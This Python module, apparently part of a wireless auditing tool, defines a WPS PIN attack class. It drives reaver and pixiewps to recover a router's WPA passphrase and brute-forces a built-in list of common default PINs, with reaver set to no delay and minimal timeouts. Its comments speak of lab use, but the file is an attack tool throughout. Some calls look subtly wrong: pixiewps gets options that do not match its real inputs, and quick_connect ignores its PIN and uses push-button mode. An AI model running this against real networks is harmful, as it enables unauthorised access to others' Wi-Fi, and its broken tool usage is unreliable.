#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import threading
import logging
from concurrent.futures import ThreadPoolExecutor
from ..util.process import Process
from ..util.color import Color

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class WPSAttack(object):
    '''Enhanced WPS PIN attack with optimized timeout and threading'''

    def __init__(self, target, pin=None, bssid=None, essid=None, interface=None):
        """
        Args:
            target: Target network object
            pin: WPS PIN (8-digit string, optional for brute force)
            bssid: BSSID of target
            essid: ESSID of target
            interface: Wireless interface to use
        """
        self.target = target
        self.pin = pin
        self.bssid = bssid or target.bssid
        self.essid = essid or target.essid
        self.interface = interface
        self.executor = ThreadPoolExecutor(max_workers=2)
        
        # WPS attack parameters
        self.wps_timeout = 120  # Reduced from 300 for lab environments
        self.retry_limit = 3
        self.psk = None
        self.success = False

    def attack_with_pin(self, pin=None):
        '''
        Attack WPS with specific PIN.
        Returns: (success: bool, psk: str or None)
        '''
        if pin:
            self.pin = pin
        
        if not self.pin:
            raise ValueError("PIN must be specified")

        logger.info(f"[*] Attempting WPS attack with PIN: {self.pin}")
        
        try:
            # Use pixiewps or reaver
            if self._try_pixiewps():
                return True, self.psk
            
            if self._try_reaver():
                return True, self.psk
            
        except Exception as e:
            logger.error(f"[!] WPS attack error: {str(e)}")

        return False, None

    def _try_pixiewps(self):
        '''Try to crack WPS using pixiewps (fast method)'''
        try:
            logger.info("[*] Attempting pixiewps attack...")
            
            # Capture WPS data first
            cmd = [
                'timeout', str(self.wps_timeout),
                'pixiewps',
                '-e', self.essid,
                '-b', self.bssid,
                '-p', self.pin,
                '-c'  # Crack mode
            ]
            
            proc = Process(cmd, devnull=False)
            output = proc.stdout()
            
            # Parse output for PSK
            if 'PSK:' in output or 'Key:' in output:
                for line in output.split('\n'):
                    if 'PSK:' in line or 'Key:' in line:
                        self.psk = line.split(':')[1].strip()
                        logger.info(f"[+] PSK found: {self.psk}")
                        self.success = True
                        return True
        
        except Exception as e:
            logger.debug(f"Pixiewps error: {str(e)}")

        return False

    def _try_reaver(self):
        '''Try to crack WPS using reaver'''
        try:
            logger.info("[*] Attempting reaver attack...")
            
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', self.bssid,
                '-p', self.pin,
                '-c', self.target.channel if hasattr(self.target, 'channel') else '6',
                '-K', '1',  # Immediate exit on success
                '-N',  # No-nacks (faster)
                '-d', '0',  # No delay
                '-T', '0.5',  # Min timeout
                '-t', str(self.wps_timeout),  # Timeout
            ]
            
            proc = Process(cmd, devnull=False)
            output = proc.stdout()
            
            # Parse reaver output
            if 'WPA PSK:' in output:
                for line in output.split('\n'):
                    if 'WPA PSK:' in line:
                        self.psk = line.split(':')[1].strip().strip("'\"")
                        logger.info(f"[+] PSK found via Reaver: {self.psk}")
                        self.success = True
                        return True
        
        except Exception as e:
            logger.debug(f"Reaver error: {str(e)}")

        return False

    def brute_force_pins(self, common_pins=None):
        '''
        Brute force WPS PINs from common set.
        Returns: (success: bool, pin: str, psk: str)
        '''
        if common_pins is None:
            # Common WPS PINs
            common_pins = [
                '00000000', '11111111', '12345670',
                '12345678', '87654321', '99999999',
                '11223344', '44332211', '10203040',
            ]

        logger.info(f"[*] Starting WPS PIN brute force ({len(common_pins)} PINs)")

        for pin in common_pins:
            logger.info(f"[*] Trying PIN: {pin}")
            
            success, psk = self.attack_with_pin(pin)
            if success:
                logger.info(f"[+] Success! PIN: {pin}, PSK: {psk}")
                return True, pin, psk
            
            time.sleep(1)

        logger.warning("[!] WPS PIN brute force failed")
        return False, None, None

    def quick_connect(self, pin):
        '''
        Quick WPS connection without full attack.
        Useful for lab environments where PIN is known.
        '''
        logger.info(f"[*] Attempting quick WPS connection with PIN: {pin}")
        
        try:
            # Use wpa_cli to connect
            cmd = [
                'wpa_cli',
                '-i', self.interface,
                'wps_pbc'
            ]
            
            Process(cmd).wait()
            
            time.sleep(5)
            
            # Check if connected
            if self._check_connection():
                logger.info("[+] WPS connection successful")
                return True
        
        except Exception as e:
            logger.error(f"[!] Quick connect error: {str(e)}")

        return False

    def _check_connection(self):
        '''Check if successfully connected'''
        try:
            cmd = ['wpa_cli', '-i', self.interface, 'status']
            output = Process(cmd).stdout()
            return 'wpa_state=COMPLETED' in output
        except:
            return False


if __name__ == '__main__':
    print("WPS Attack module loaded")
